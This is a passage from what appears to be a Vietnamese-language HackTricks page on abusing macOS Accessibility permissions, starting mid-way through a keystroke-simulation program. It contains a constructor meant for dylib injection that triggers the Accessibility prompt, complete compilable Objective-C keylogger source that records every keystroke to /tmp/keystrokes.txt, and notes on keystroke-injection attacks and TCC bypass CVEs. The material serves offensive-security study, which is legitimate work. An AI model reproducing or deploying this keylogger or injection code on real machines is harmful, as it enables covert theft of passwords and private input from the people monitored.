        for (int i = 0; i < 10; ++i) {
            SimulateKeyPress((CGKeyCode)36); // Key code for Enter
            usleep(100000); // 0.1 seconds
        }
    }
    return 0;
}
```

{{#endtab}}

{{#tab name="Check / Prompt"}}
Kiểm tra xem tiến trình hiện tại đã được cấp quyền Accessibility hay chưa; nếu chưa, yêu cầu macOS hiển thị giao diện xin cấp quyền.

```objectivec
#import <Foundation/Foundation.h>
#import <ApplicationServices/ApplicationServices.h>
__attribute__((constructor))
static void axprompt(int argc, const char **argv) {
    NSDictionary *opts = @{(__bridge id)kAXTrustedCheckOptionPrompt: @YES};
    BOOL trusted = AXIsProcessTrustedWithOptions((__bridge CFDictionaryRef)opts);
    NSLog(@"Accessibility access: %@", trusted ? @"granted" : @"pending/denied");
}
```

{{#endtab}}

{{#tab name="Keylogger"}}
Lưu các phím đã nhấn vào **`/tmp/keystrokes.txt`**

```objectivec
#import <Foundation/Foundation.h>
#import <ApplicationServices/ApplicationServices.h>
#import <Carbon/Carbon.h>

// clang -framework Foundation -framework ApplicationServices -framework Carbon -o KeyboardMonitor KeyboardMonitor.m

NSString *const kKeystrokesLogPath = @"/tmp/keystrokes.txt";

void AppendStringToFile(NSString *str, NSString *filePath) {
    NSFileHandle *fileHandle = [NSFileHandle fileHandleForWritingAtPath:filePath];
    if (fileHandle) {
        [fileHandle seekToEndOfFile];
        [fileHandle writeData:[str dataUsingEncoding:NSUTF8StringEncoding]];
        [fileHandle closeFile];
    } else {
        // If the file does not exist, create it
        [str writeToFile:filePath atomically:YES encoding:NSUTF8StringEncoding error:nil];
    }
}

CGEventRef KeyboardEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon) {
    if (type == kCGEventKeyDown) {
        CGKeyCode keyCode = (CGKeyCode)CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);

        NSString *keyString = nil;
        // First, handle special non-printable keys
        switch (keyCode) {
            case kVK_Return: keyString = @"<Return>"; break;
            case kVK_Tab: keyString = @"<Tab>"; break;
            case kVK_Space: keyString = @"<Space>"; break;
            case kVK_Delete: keyString = @"<Delete>"; break;
            case kVK_Escape: keyString = @"<Escape>"; break;
            case kVK_Command: keyString = @"<Command>"; break;
            case kVK_Shift: keyString = @"<Shift>"; break;
            case kVK_CapsLock: keyString = @"<CapsLock>"; break;
            case kVK_Option: keyString = @"<Option>"; break;
            case kVK_Control: keyString = @"<Control>"; break;
            case kVK_RightControl: keyString = @"<Control>"; break;
            case kVK_RightShift: keyString = @"<Shift>"; break;
            case kVK_RightOption: keyString = @"<Option>"; break;
            case kVK_Function: keyString = @"<Function>"; break;
            case kVK_F1: keyString = @"<F1>"; break;
            case kVK_F2: keyString = @"<F2>"; break;
            case kVK_F3: keyString = @"<F3>"; break;
            // Add more cases here for other non-printable keys...
            default: break; // Not a special non-printable key
        }

        // If it's not a special key, try to translate it
        if (!keyString) {
            UniCharCount maxStringLength = 4;
            UniCharCount actualStringLength = 0;
            UniChar unicodeString[maxStringLength];

            TISInputSourceRef currentKeyboard = TISCopyCurrentKeyboardInputSource();
            CFDataRef layoutData = TISGetInputSourceProperty(currentKeyboard, kTISPropertyUnicodeKeyLayoutData);
            const UCKeyboardLayout *keyboardLayout = (const UCKeyboardLayout *)CFDataGetBytePtr(layoutData);

            UInt32 deadKeyState = 0;
            OSStatus status = UCKeyTranslate(keyboardLayout,
                                             keyCode,
                                             kUCKeyActionDown,
                                             0,
                                             LMGetKbdType(),
                                             kUCKeyTranslateNoDeadKeysBit,
                                             &deadKeyState,
                                             maxStringLength,
                                             &actualStringLength,
                                             unicodeString);
            CFRelease(currentKeyboard);

            if (status == noErr && actualStringLength > 0) {
                keyString = [NSString stringWithCharacters:unicodeString length:actualStringLength];
            } else {
                keyString = [NSString stringWithFormat:@"<KeyCode: %d>", keyCode];
            }
        }

        NSString *logString = [NSString stringWithFormat:@"%@\n", keyString];
        AppendStringToFile(logString, kKeystrokesLogPath);
    }
    return event;
}

int main() {
    @autoreleasepool {
        CGEventMask eventMask = CGEventMaskBit(kCGEventKeyDown);
        CFMachPortRef eventTap = CGEventTapCreate(kCGSessionEventTap, kCGHeadInsertEventTap, 0, eventMask, KeyboardEventCallback, NULL);

        if (!eventTap) {
            NSLog(@"Failed to create event tap");
            exit(1);
        }

        CFRunLoopSourceRef runLoopSource = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, eventTap, 0);
        CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource, kCFRunLoopCommonModes);
        CGEventTapEnable(eventTap, true);
        CFRunLoopRun();
    }
    return 0;
}
```

{{#endtab}}
{{#endtabs}}

> [!CAUTION] > **Accessibility là một quyền rất mạnh**, bạn có thể lạm dụng nó theo những cách khác, chẳng hạn như thực hiện **keystrokes attack** chỉ bằng quyền này mà không cần gọi System Events.

> [!TIP]
> Các phiên bản macOS mới hơn cũng tách việc lạm dụng desktop session giữa **Input Monitoring** (`kTCCServiceListenEvent`) và **synthetic input** (`kTCCServicePostEvent`). Nếu bạn cần keylogging, chụp màn hình hoặc injection sự kiện thô thay vì tự động hóa AXUIElement, hãy xem [macOS Input Monitoring, Screen Capture & Accessibility Abuse](../macos-input-monitoring-screen-capture-accessibility.md).

## References

- [1] [Cisco Talos - Cách nhiều lỗ hổng trong các ứng dụng Microsoft dành cho macOS mở đường cho việc đánh cắp quyền](https://blog.talosintelligence.com/how-multiple-vulnerabilities-in-microsoft-apps-for-macos-pave-the-way-to-stealing-permissions/)
- [2] [CoreLocationCLI](https://github.com/fulldecent/corelocationcli)
- [3] [Apple Developer - Yêu cầu cấp quyền cho việc thu thập media trên macOS](https://developer.apple.com/documentation/bundleresources/requesting-authorization-for-media-capture-on-macos?language=objc)
- [4] [Apple Developer - Thu thập nội dung HDR bằng ScreenCaptureKit (WWDC24)](https://developer.apple.com/videos/play/wwdc2024/10088/)
- [5] [vsociety - CVE-2023-26818: Bypass macOS TCC bằng Telegram qua DyLib Injection Phần 1](https://vsociety.medium.com/cve-2023-26818-macos-tcc-bypass-with-telegram-using-dylib-injection-part1-768b34efd8c4)
- [6] [Vicarius vsociety - CVE-2023-26818: Khai thác bypass macOS TCC bằng Telegram (Phần 1)](https://www.vicarius.io/vsociety/posts/cve-2023-26818-exploit-macos-tcc-bypass-w-telegram-part-1-2)
- [7] [Apple Developer - Thu thập âm thanh hệ thống bằng Core Audio taps](https://developer.apple.com/documentation/coreaudio/capturing-system-audio-with-core-audio-taps)
- [8] [catap - Python bindings và recorder cho Core Audio process taps](https://github.com/sbetko/catap)
{{#include ../../../../banners/hacktricks-training.md}}
